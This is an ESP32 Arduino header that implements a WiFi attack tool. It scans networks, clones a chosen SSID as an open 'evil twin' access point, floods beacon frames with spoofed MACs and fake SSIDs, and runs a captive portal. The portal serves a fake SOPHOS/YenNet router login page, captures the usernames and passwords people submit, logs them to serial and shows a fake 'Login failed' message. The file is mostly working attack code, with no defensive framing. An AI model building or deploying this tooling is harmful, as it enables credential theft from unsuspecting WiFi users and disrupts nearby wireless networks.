#ifndef WIFI_TOOL_H
#define WIFI_TOOL_H

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Arduino.h>
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_random.h"

class WiFiTool {
private:
    // Constants
    static const int maxNetworks = 20;       // Max number of networks to scan
    String ssidList[maxNetworks];     // Array to store SSIDs of available networks
    int numNetworks = 0;              // Number of networks found during scan

    // List of SSIDs for beacon flooding
    const char *beacon_ssid_list[11] = {
        "FreeWiFi", "HackNet", "Open_AP", "NSA_Surveillance", "Coffee_Shop_Wifi" , "Dragon", "Free_Wifi2", "Public_Wifi", "Free_Wifi_2", "Public_W" , "Starbucks"
    };

    // Parameters for beacon frames
    const uint8_t supported_rates[10] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
    };
    const uint8_t ds_param_set[3] = { 0x03, 0x01, 0x06 };

    // Global flags to control operations
    bool isBeaconFloodRunning = false;
    bool isEvilTwinRunning = false;
    bool isEvilTwinWithPortalRunning = false;

    // Captive portal components
    DNSServer dnsServer;
    WebServer server;
    IPAddress apIP = IPAddress(192, 168, 4, 1);

    // Fake router login page (TP-Link style, as provided)
    const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
      body { font-family: Arial; background-color: #f2f2f2; text-align: center; padding-top: 50px; }
      .login-box { background: white; padding: 30px; border-radius: 8px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.3); }
      .logo {
         font-size: 32px; font-weight: bold; color: white; background-color: #003b5c;
         padding: 10px; border-radius: 5px; margin-bottom: 20px;
      }
      h2 { color: #007bff; }
      input { margin: 10px; padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 4px; }
      .btn { background-color: #4CAF50; color: white; border: none; padding: 12px 20px; cursor: pointer; border-radius: 4px; }
      .portal-footer { margin-top: 15px; font-size: 12px; }
   </style>
   <head>
      <title>YenNet Portal</title>
   </head>
   <body>
      <div class="login-box">
         <div class="logo">SOPHOS</div>
         <h2>YenNet Portal</h2>
         <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Sign in" class="btn">
         </form>
         <div class="portal-footer">
            <a href="#">Access the User Portal</a><br>
            <span>Data Limit 5GB/Day</span>
         </div>
      </div>
   </body>
</html>
    )rawliteral";

    // Function to send a single beacon frame
    void sendBeacon(const char *ssid) {
        uint8_t beacon[256];
        uint8_t mac[6];
        esp_fill_random(mac, 6);  // Generate random MAC address
        mac[0] &= 0xFE; // Unicast
        mac[0] |= 0x02; // Locally administered
        
        int pos = 0;
        
        // Beacon frame header
        uint8_t header[] = {
            0x80, 0x00, // Beacon frame control
            0x00, 0x00, // Duration
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source MAC
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
            0x00, 0x00 // Sequence number
        };
        memcpy(&beacon[pos], header, sizeof(header));
        pos += sizeof(header);
        
        // Fixed parameters
        uint8_t fixed[] = {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
            0x64, 0x00, // Interval
            0x31, 0x04  // Capabilities
        };
        memcpy(&beacon[pos], fixed, sizeof(fixed));
        pos += sizeof(fixed);
        
        // SSID Tag
        uint8_t ssid_tag = 0x00;
        uint8_t ssid_len = strlen(ssid);
        beacon[pos++] = ssid_tag;
        beacon[pos++] = ssid_len;
        memcpy(&beacon[pos], ssid, ssid_len);
        pos += ssid_len;
        
        // Supported rates and DS parameter set
        memcpy(&beacon[pos], supported_rates, sizeof(supported_rates));
        pos += sizeof(supported_rates);
        memcpy(&beacon[pos], ds_param_set, sizeof(ds_param_set));
        pos += sizeof(ds_param_set);
        
        // Send the beacon frame
        esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
    }

public:
    WiFiTool() : isBeaconFloodRunning(false), isEvilTwinRunning(false), isEvilTwinWithPortalRunning(false), server(80) {}

    void setup() {
        Serial.println("WiFi Tool module initialized");
    }

    // Function to display menu
    void displayMenu() {
        Serial.println("\n===== WiFi Tool Menu =====");
        Serial.println("1. Scan for WiFi Networks");
        Serial.println("2. Start Evil Twin Attack");
        Serial.println("3. Start Beacon Flooding");
        Serial.println("4. Stop Current Operation");
        Serial.println("5. Start Evil Twin with Captive Portal");
        Serial.println("========================");
    }

    // Function to scan for WiFi networks
    void scanWiFi() {
        Serial.println("Scanning for available networks...");
        
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
        
        numNetworks = WiFi.scanNetworks();
        
        if (numNetworks == 0) {
            Serial.println("No networks found");
        } else {
            Serial.println("Networks found:");
            // Store and display the SSIDs of available networks
            for (int i = 0; i < numNetworks && i < maxNetworks; i++) {
                ssidList[i] = WiFi.SSID(i);
                Serial.print(i + 1);
                Serial.print(": ");
                Serial.print(ssidList[i]);
                Serial.print(" (");
                Serial.print(WiFi.RSSI(i));
                Serial.println(" dBm)");
            }
        }
    }

    // Original function to start Evil Twin attack (unchanged)
    void startEvilTwin() {
        isEvilTwinRunning = true;
        
        // First scan for networks
        Serial.println("Scanning for networks to clone...");
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
        
        numNetworks = WiFi.scanNetworks();
        
        if (numNetworks == 0) {
            Serial.println("No networks found to clone.");
            isEvilTwinRunning = false;
            return;
        }
        
        // Display available networks
        Serial.println("Available networks to clone:");
        for (int i = 0; i < numNetworks && i < maxNetworks; i++) {
            ssidList[i] = WiFi.SSID(i);
            Serial.print(i + 1);
            Serial.print(": ");
            Serial.print(ssidList[i]);
            Serial.print(" (");
            Serial.print(WiFi.RSSI(i));
            Serial.println(" dBm)");
        }
        
        // Let the user select an SSID to clone
        Serial.println("Enter the number of the SSID to clone (1 to " + String(numNetworks) + "):");
        
        int selectedSSID = -1;
        unsigned long startTime = millis();
        
        // Wait for user input with timeout
        while (selectedSSID < 1 || selectedSSID > numNetworks) {
            if (Serial.available() > 0) {
                selectedSSID = Serial.parseInt();
                Serial.read(); // Clear the newline character
                
                if (selectedSSID < 1 || selectedSSID > numNetworks) {
                    Serial.println("Invalid selection. Try again:");
                }
            }
            
            // Timeout after 30 seconds
            if (millis() - startTime > 30000) {
                Serial.println("Timeout waiting for input.");
                isEvilTwinRunning = false;
                return;
            }
            
            delay(10);
        }
        
        // Clone the selected network
        String targetSSID = ssidList[selectedSSID - 1];
        Serial.println("Starting Evil Twin AP for: " + targetSSID);
        
        // Stop any ongoing operations first without message
        isBeaconFloodRunning = false;
        isEvilTwinWithPortalRunning = false;
        WiFi.disconnect();
        server.close();
        dnsServer.stop();
        
        // Start the evil twin AP
        WiFi.mode(WIFI_AP);
        WiFi.softAP(targetSSID.c_str(), "");
        
        IPAddress myIP = WiFi.softAPIP();
        Serial.println("Evil Twin AP started successfully!");
        Serial.print("AP IP address: ");
        Serial.println(myIP);
    }

    // New function to start Evil Twin with captive portal (static AP)
    void startEvilTwinWithPortal() {
        isEvilTwinWithPortalRunning = true;
        
        // Stop any ongoing operations
        isBeaconFloodRunning = false;
        isEvilTwinRunning = false;
        WiFi.disconnect();
        server.close();
        dnsServer.stop();
        
        Serial.println("Starting Evil Twin AP with Captive Portal...");
        
        // Create fake AP with static SSID and password
        WiFi.mode(WIFI_AP);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP("YenNet", "yennet428");
        
        // Start DNS redirection
        dnsServer.start(53, "*", apIP);
        
        // Serve the fake login page
        server.on("/", HTTP_GET, [this]() {
            server.send(200, "text/html", loginPage);
        });
        
        // Handle form submission
        server.on("/login", HTTP_POST, [this]() {
            String user = server.arg("username");
            String pass = server.arg("password");
            Serial.println("🟢 Credentials Captured!");
            Serial.println("Username: " + user);
            Serial.println("Password: " + pass);
            server.send(200, "text/html", "<h3>Login failed. Please try again later.</h3>");
        });
        
        // Redirect all other requests to the login page
        server.onNotFound([this]() {
            server.sendHeader("Location", "/", true);
            server.send(302, "text/plain", "");
        });
        
        server.begin();
        
        Serial.println("🚨 Fake Wi-Fi AP with Captive Portal launched!");
        Serial.print("SSID: "); Serial.println("YenNet");
        Serial.print("Password: "); Serial.println("yennet428");
        Serial.print("Portal IP: "); Serial.println(WiFi.softAPIP());
    }

    // Function to start beacon flooding
    void startBeaconFlood() {
        // Stop any ongoing operations
        isEvilTwinRunning = false;
        isEvilTwinWithPortalRunning = false;
        WiFi.disconnect();
        server.close();
        dnsServer.stop();
        
        Serial.println("Starting beacon flood...");
        
        WiFi.mode(WIFI_AP);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_max_tx_power(84); // Max power
        
        isBeaconFloodRunning = true;
    }

    // Function to stop current operation
    void stopOperation() {
        isBeaconFloodRunning = false;
        isEvilTwinRunning = false;
        isEvilTwinWithPortalRunning = false;
        WiFi.disconnect();
        WiFi.mode(WIFI_OFF);
        server.close();
        dnsServer.stop();
        Serial.println("All WiFi operations stopped.");
    }

    void loop() {
        // Handle captive portal requests if Evil Twin with portal is running
        if (isEvilTwinWithPortalRunning) {
            dnsServer.processNextRequest();
            server.handleClient();
        }
        
        // Check for beacon flooding status and send beacons if active
        if (isBeaconFloodRunning) {
            for (int i = 0; i < 5; i++) {
                sendBeacon(beacon_ssid_list[i]);
                // Reduced serial output to improve performance
                if (i == 0) {
                    Serial.println("Flooding beacons...");
                }
                delay(50); // Reduced delay for faster flooding
            }
        }
    }
};

#endif // WIFI_TOOL_H